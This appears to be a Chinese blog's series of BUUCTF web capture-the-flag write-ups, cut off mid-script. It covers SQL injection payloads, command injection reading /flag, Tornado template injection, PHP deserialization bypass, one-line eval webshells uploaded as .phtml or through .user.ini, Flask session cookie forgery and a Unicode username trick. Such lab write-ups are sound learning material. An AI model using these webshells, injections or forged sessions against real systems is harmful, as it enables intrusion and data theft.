","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛include"},{"categories":["CTF"],"content":"[极客大挑战 2019]Secret File查看源码，又一个背景是黑色的超链接跳转到 Archive_room.php。 查看源码SECRET跳转的是action.php。 但是跳转以后是url地址为end.php，所以中间跳过了一个页面，使用bp抓包查看。 stristr()函数返回字符串中子串第一次出现位置之后的内容，简而言之还是过滤。 同样使用php伪协议filter过滤器读取文件 ?file=php://filter/convert.base64-encode/resource=flag.php PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZmZjZTAwNWYtYjEyOS00YWM1LTg3MzYtZDM3YzUwYjYxNjZkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo= 解密得到网页源码，flag在其中。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019secret-file"},{"categories":["CTF"],"content":"[极客大挑战 2019]LoveSQL顶端の告诫：用 sqlmap 是没有灵魂的 尝试万能密码（其实没卵用） 'or 1=1 # 任意密码 这道题是常规的sql注入，测注入点、查字段数、爆库、爆字段值、爆表。组合拳 字段数： 1' order by 3 # 爆库： 1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() # geekuser,l0ve1ysq1 爆字段值： 1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1' # id,username,password 爆表： 1' union select 1,2,group_concat(id,username,password) from l0ve1ysq1 # '1cl4ywo_tai_nan_le,2glzjinglzjin_wants_a_girlfriend,3Z4cHAr7zCrbiao_ge_dddd_hm,40xC4m3llinux_chuang_shi_ren,5Ayraina_rua_rain,6Akkoyan_shi_fu_de_mao_bo_he,7fouc5cl4y,8fouc5di_2_kuai_fu_ji,9fouc5di_3_kuai_fu_ji,10fouc5di_4_kuai_fu_ji,11fouc5di_5_kuai_fu_ji,12fouc5di_6_kuai_fu_ji,13fouc5di_7_kuai_fu_ji,14fouc5di_8_kuai_fu_ji,15leixiaoSyc_san_da_hacker,16flagflag{c4e8849c-e0e3-4e0d-b701-26a5abeec46a}' ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019lovesql"},{"categories":["CTF"],"content":"2021.01.21","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210121"},{"categories":["CTF"],"content":"[GXYCTF2019]Ping Ping Ping传送门 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#gxyctf2019ping-ping-ping"},{"categories":["CTF"],"content":"[ACTF2020 新生赛]Exec肯定是尝试管道符 127.0.0.1|cat /flag ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛exec"},{"categories":["CTF"],"content":"[护网杯 2018]easy_tornado打开页面三个超链接 /flag.txt /welcome.txt hints.txt 内容分别是 flag in /fllllllllllllag render md5(cookie_secret+md5(filename)) 进入hints.txt注意到url地址此时为 /file?filename=/hints.txt\u0026filehash=2a84a09bc1d5e3d8745131754ff208fa 再根据hints.txt文件的内容，推断可以使用url方式访问文件，但是需要提供filehash值，加密的方法即hints.txt的内容：md5(cookie_secret+md5(filename))。flag文件的名称filename有了，接下来就是获取cookie_secret的值。 接下来触及到盲区了，获取cookie_secret是看wp。 render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用 在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量 获取cookie_secret的payload /error?msg={{handler.settings}} 获得cookie_secret的值为 eb326d39-cd67-47bd-b2d3-71125996417b 根据hints.txt的url验证一下是如何加密的。 选中的蓝色部分是/hints.txt加密后的md5值。推断出filehash格式以后直接访问flag文件，payload： /file?filename=/hints.txt\u0026filehash=2a84a09bc1d5e3d8745131754ff208fa ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#护网杯-2018easy_tornado"},{"categories":["CTF"],"content":"[极客大挑战 2019]Knife一句话直接连。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019knife"},{"categories":["CTF"],"content":"[RoarCTF 2019]Easy Calc一个计算器随便试一试，当输入字母时会报错。查看网页源码，在script中发现了运行计算器的php文件：calc.php，但是也有一句很重要的注释 \u003c!--I've set up WAF to ensure security.--\u003e php的正则表达式中并没有过滤字母的条件，所以我们输入字母被过滤是因为WAF，接下来是参考网上的wp自己的理解 可以在calc.php传参 ? num=a php会输出一个值a，说明已经绕过了WAF。这里使用的是WAF和php解析方法不一样，WAF解析到空格' ‘会直接过滤掉，这样WAF认为传入的就是一个空值，并不会识别num，但是php解析的时候会把空格去掉，这样就能get到num的值。 接下来绕过正则就可以使用char()的方式使用ascii码转。空格被过滤但是想使用php输出可以使用var_dump() 查看根目录下文件，可以使用scandir（）遍历文件夹，其中char（47）——\u003e ‘/’ ： ? num=1;var_dump(scandir(chr(47))) 找到了疑似flag文件：f1agg，使用file_get_contents（）读取文件 ?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#roarctf-2019easy-calc"},{"categories":["CTF"],"content":"[极客大挑战 2019]Http查看源码在\"氛围\"这两个字上有隐藏的跳转Secret.php。进入以后页面显示 It doesn't come from 'https://www.Sycsecret.com' 提示页面不是来自这个网址，所以在HackBar上加上Referer。之后又提示 Please use \"Syclover\" browser 加上User-Agent。提示 No!!! you can only read this locally!!! 加上X-Forwarded-For。HTTP X-Forwarded-For 介绍 最终的请求头： GET /Secret.php HTTP/1.1 Host: node3.buuoj.cn:26715 Upgrade-Insecure-Requests: 1 User-Agent: Syclover Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 x-forwarded-for: 127.0.0.1 referer: https://www.Sycsecret.com Connection: close ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019http"},{"categories":["CTF"],"content":"[极客大挑战 2019]PHP源码备份在www.zip中。下载以后有五个文件 class.php flag.php index.js index.php style.css 在index.php中有一段代码 \u003c?php include 'class.php'; $select = $_GET['select']; $res=unserialize(@$select); ?\u003e 再结合又一个class.php，所以这道题考点应该是反序列化。 class.php \u003c?php include 'flag.php'; error_reporting(0); class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-\u003eusername = $username; $this-\u003epassword = $password; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if ($this-\u003epassword != 100) { echo \"\u003c/br\u003eNO!!!hacker!!!\u003c/br\u003e\"; echo \"You name is: \"; echo $this-\u003eusername;echo \"\u003c/br\u003e\"; echo \"You password is: \"; echo $this-\u003epassword;echo \"\u003c/br\u003e\"; die(); } if ($this-\u003eusername === 'admin') { global $flag; echo $flag; }else{ echo \"\u003c/br\u003ehello my friend~~\u003c/br\u003esorry i can't give you the flag!\"; die(); } } } ?\u003e 获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解CVE-2016-7124漏洞复现 我使用的构造对象 \u003c?php class Name{ private $username ='admin'; private $password ='100'; } $a = new Name; echo serialize($a); O:4:\"Name\":2:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";} 反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload ?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";s:3:\"100\";} ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019php"},{"categories":["CTF"],"content":"[极客大挑战 2019]Upload先尝试上传一个gif图片马内容为 GIF89a \u003c?php @eval($_POST['a']); 页面提示过滤： NO! HACKER! your file included ‘\u003c?’ 尝试script执行php代码 \u003cscript language=\"php\"\u003eeval($_POST['cmd'])\u003c/script\u003e 可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019upload"},{"categories":["CTF"],"content":"2021.01.28","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#20210128"},{"categories":["CTF"],"content":"[极客大挑战 2019]BabySQL尝试万能密码，发现报错了：1=1#’ and password=‘123’，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有information这个词，其中的for也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。 爆数据库（填密码）： 1' uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() # 爆表： 1' uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name='b4bsql' # 爆字段值： 1' uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql # ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019babysql"},{"categories":["CTF"],"content":"[ACTF2020 新生赛]Upload指针放在灯泡上护显示上传文件的，图片马 233.gif GIF89a \u003c?php @eval($_POST['a']); 尝试phtml是否被过滤，直接上传成功。蚁剑连接 ------WebKitFormBoundaryUMSByAQmR2cduL6R Content-Disposition: form-data; name=\"upload_file\"; filename=\"233.phtml\" Content-Type: image/gif GIF89a \u003c?php @eval($_POST['a']); ------WebKitFormBoundaryUMSByAQmR2cduL6R Content-Disposition: form-data; name=\"submit\" upload ------WebKitFormBoundaryUMSByAQmR2cduL6R-- ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛upload"},{"categories":["CTF"],"content":"[ACTF2020 新生赛]BackupFile Try to find out source file! 题目提示备份文件，备份文件常见后缀： .git .svn .swp .~ .bak .bash_history 尝试index.php.bak，下载了一个备份文件： \u003c?php include_once \"flag.php\"; if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(\"Just num!\"); } $key = intval($key); $str = \"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"; if($key == $str) { echo $flag; } } else { echo \"Try to find out source file!\"; } 传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的==和===的区别。贴一段简单代码 \u003c?php $str = 'abc'; if(0==$str){ echo \"真\"; }else{ echo \"假\"; } ==在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。 全等于===操作过程如下： 操作符两边的数据类型如果不相同，返回false 。 操作符两边的值如果不相同，返回false 。 最后将上面2步的操作进行与操作。返回与操作的结果。 所以最终的payload： ?key=123 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#actf2020-新生赛backupfile"},{"categories":["CTF"],"content":"[HCTF 2018]admin可以在注释里找到 思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。 post。发表文章，但是没能找到在哪里打开 change password。改密码，尝试下能不能抓包改到admin的密码 修改密码抓到的包： 感觉并没有什么下手的地方，唯一的就是session可能和身份有关。 以下的是看网上的wp 在change password页面查看源码，发现提供了题目的源码地址 \u003c!-- https://github.com/woadsl1234/hctf_flask/ --\u003e 网站使用的是flask框架，具体路由表如下 @app.route('/code') #二维码 def get_code(): @app.route('/index') #首页 def index(): @app.route('/register', methods = ['GET', 'POST']) #注册 def register(): @app.route('/login', methods = ['GET', 'POST']) #登陆 def login(): @app.route('/logout') #登出 def logout(): @app.route('/change', methods = ['GET', 'POST']) #修改密码 def change(): @app.route('/edit', methods = ['GET', 'POST']) #编辑信息 def edit(): ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#hctf-2018admin"},{"categories":["CTF"],"content":"解法一：flask session伪造这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。 贴两篇相关文章： Python Web之flask session\u0026格式化字符串漏洞 客户端 session 导致的安全问题 首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。 说明一下flask的session值加密格式是：SECRET_KEY +一个用户对象的字符串(就像PHP里的序列化后)。SECRET_KEY的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行 SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123' 可以得知SECRET_KEY值为ckj123。然后在index.html页面发现只要session[‘name’] == ‘admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。 如下 P师傅 的程序解密： #!/usr/bin/env python3 import sys import zlib from base64 import b64decode from flask.sessions import session_json_serializer from itsdangerous import base64_decode def decryption(payload): payload, sig = payload.rsplit(b'.', 1) payload, timestamp = payload.rsplit(b'.', 1) decompress = False if payload.startswith(b'.'): payload = payload[1:] decompress = True try: payload = base64_decode(payload) except Exception as e: raise Exception('Could not base64 decode the payload because of ' 'an exception') if decompress: try: payload = zlib.decompress(payload) except Exception as e: raise Exception('Could not zlib decompress the payload before ' 'decoding the payload') return session_json_serializer.loads(payload) if __name__ == '__main__': print(decryption(sys.argv[1].encode())) 执行命令 python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA 结果 {'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'guobang', 'user_id': '10'} 然后我们需要吧name的值修改为admin。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：flask-session-cookie-manager 这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号\"\"括起来 python flask_session_cookie_manager{2,3}.py {encode,decode} -s “SECRET_KEY” 都需要使用 -c “Session cookie value” session的值 只有解密decode用得到 -t “Session cookie structure” cookie结构 只有encode用得 执行 python flask_session_cookie_manager3.py encode -s \"ckj123\" -t \"{'_fresh': True, '_id': b'a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6', 'csrf_token': b'895783633ba12f15aedff2c4b355f0e9cb3158ee', 'image': b'AYHD', 'name': 'admin', 'user_id': '10'}\" 得到 .eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg 放在请求头中，格式为 cookie: session=加密内容 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:1:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#解法一flask-session伪造"},{"categories":["CTF"],"content":"解法二：Unicode欺骗第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为 ᴬᴰᴹᴵᴺ——注册后——\u003eADMIN—修改密码—\u003eadmin payload ᴬᴰᴹᴵᴺ 注册以后使用ᴬᴰᴹᴵᴺ登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:2:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#解法二unicode欺骗"},{"categories":["CTF"],"content":"[极客大挑战 2019]BuyFlag网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示 Only Cuit’s students can buy the FLAG 应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php \u003c!-- ~~~post money and password~~~ if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo \"password can't be number\u003c/br\u003e\"; }elseif ($password == 404) { echo \"Password Right!\u003c/br\u003e\"; } } 还记得php==关系运算会强制转换类型，用POST传一个password=404a，404a会被强制转换为404，密码就对上了。接下来是钱的问题，flag需要100000000块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，10e10，就是10的10次方，通过。最终的请求： POST /pay.php HTTP/1.1 Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn Content-Length: 25 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: user=1 Connection: close password=404a\u0026money=10e10 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#极客大挑战-2019buyflag"},{"categories":["CTF"],"content":"[SUCTF 2019]CheckIn知识点 .user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache. 准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装： GIF89a auto_prepend_file=233.gif 接下来上传图片马，尝试了正常上传PHP马会提示： 所以使用script马执行php： GIF89a \u003cscript language=\"php\"\u003eeval($_REQUEST[shell])\u003c/script\u003e 上传成功后会提示文件路径： Your dir uploads/852aff287f54bca0ed7757a702913e50 Your files : array(5) { [0]=\u003e string(1) “.” [1]=\u003e string(2) “..” [2]=\u003e string(9) “.user.ini” [3]=\u003e string(7) “233.gif” [4]=\u003e string(9) “index.php” } 这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(‘cat /flag’)。 ","date":"2021-01-18","objectID":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/:0:0","series":null,"tags":["web","BUUCTF_Web"],"title":"BUUCTF寒假刷题-Web","uri":"/posts/buuctf%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98-web/#suctf-2019checkin"},{"categories":["CTF"],"content":"[BJDCTF2020]Easy MD5参考： 【Jarvis OJ】Login–password='\".md5($pass,true).\" sql注入：md5($password,true) Leet More 2010 Oh Those Admins! writeup 随便输入一些东西都没有反应，在请求头中发现了一个Hint： select * from ‘admin’ where password=md5($pass,true) 语法 md5(string,raw) 参数 描述 string 必需。要计算的字符串。 raw 可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串 概括理解，这里如果raw参数为true的话，这个函数的返回值是string的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是ffifdyop，我们来对它进行一波操作 源字符串：ffifdyop md5加密值：276f722736c95d99e921722cf9ed621c hex解码：‘or'6É].é!r,ùíb. 最后那几个应该是不可见字符，重要的是前面一段：'or'6，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个'单引号。执行以后真正的sql语句为 select * from 'admin' where password=''or'6É].é!r,ùíb.‘ 可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段： a string starting with a 1 is cast as an integer when used as a boolean. 在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。 自己进行的测试： 所以真正的解法是只要sql语句的格式为password=‘xxxxxxxx’ or ‘1xxxx’，即hex包含字符串\"276f722731\"（‘or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。 下面这个程序是这道题开头参考列表中的第三个链接。 \u003c?php for ($i = 0;;) { for ($c = 0; $c \u003c 1000000; $c++, $i++) if (stripos(md5($i, true), '\\'or\\'') !== false) echo \"\\nmd5($i) = \" . md5($i, true) . \"\\n\"; echo \".\"; } ?\u003e 这个程序遍历数字进行md5加密，使用stripos匹配是否有'or'，这个函数有一个弊病就是如果是以'or'开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由\\'or\\'改为'or'([1-9]+|0+[1-9])不过我的方法自己还没跑出来🤣，回头加个多线程试一试（更新） 自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿： 找到了md5(2413633098): 找到了md5(5207660362): 找到了md5(8351555222): 找到了md5(13095770027): 找到了md5(14860117901): 找到了md5(15724086109): 找到了md5(16529176061): 找到了md5(17428338265): 找到了md5(18717303578): 找到了md5(19342380396): 找到了md5(23960028257): 找到了md5(32561902614): 找到了md5(38983153698): 找到了md5(39742292223): 找到了md5(44120894060): 找到了md5(44820604888): 找到了md5(45570673322): 找到了md5(45855250502): 找到了md5(53660569009): 找到了md5(55098175010): 找到了md5(59763304323): 找到了md5(60185044906): 找到了md5(68625783421): 找到了md5(70949326264): (md5值删了，因为乱码会影响博客的搜索功能) 程序源码如下（自己写着玩，轻喷）： # codeing = utf-8 import threading import hashlib import re import itertools import time # r'\\'or\\'([1-9]+|0+[1-9])' # r'\\'or\\'' pattern=re.compile(r'\\'or\\'([1-9]+|0+[1-9])',re.I) item = itertools.count(1) def thrfunc(): while 1: s2 = '' temp = str(next(item)) s1 = hashlib.md5(temp.encode(encoding='UTF-8')).hexdigest() for i in range(0, len(s1), 2): s2 = s2 + chr(int(s1[i:i + 2], 16)) if re.search(pattern, s2): print(\"找到了md5(\" + temp + \"): \" + s2) threads=[] for i in range(10): t = threading.Thread(target=thrfunc) 